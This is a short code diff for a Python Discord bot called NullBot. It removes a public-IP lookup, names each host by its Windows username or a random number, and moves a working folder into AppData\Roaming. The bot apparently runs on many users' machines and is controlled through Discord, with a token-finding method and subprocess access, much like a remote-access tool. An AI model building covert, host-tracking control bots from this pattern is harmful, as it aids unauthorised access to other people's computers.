@@ -6,14 +6,9 @@ from disnake.ext import commands
 
 from datetime import datetime
 from socket import create_connection
-import os, psutil, re, requests, sys, subprocess
+import os, psutil, re, requests, sys, subprocess, random
 
 ############### Global functions available in every cog
-
-def IP():
-    try: return requests.get("https://api.ipify.org").text.rstrip()
-    except: return "127.0.0.1"
-
 def genEmbed(self, title, timestamp, description=None):
     if description is None:
         embed = discord.Embed(
@@ -56,16 +51,16 @@ def find_token(self):
 #> custom bot implementation  
 
 original_dir = os.getcwd()
+identification = random.randint(10000, 90000)
 
 class NullBot(commands.InteractionBot):
     def __init__(self, **options):
         super().__init__(**options)
-        self.ip_addr = IP()
         self.original_dir = original_dir
 
         # Checks if username is Admin/Administrator
         if "dmin" in os.getenv("username"):
-            self.identifier = self.ip_addr
+            self.identifier = identification
         else:
             self.identifier = os.getenv("username") 
     
@@ -73,7 +68,7 @@ class NullBot(commands.InteractionBot):
     find_token = find_token
         
 client = NullBot(test_guilds=server_ids)
-nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
+nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata\\Roaming\\.cache"
 
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
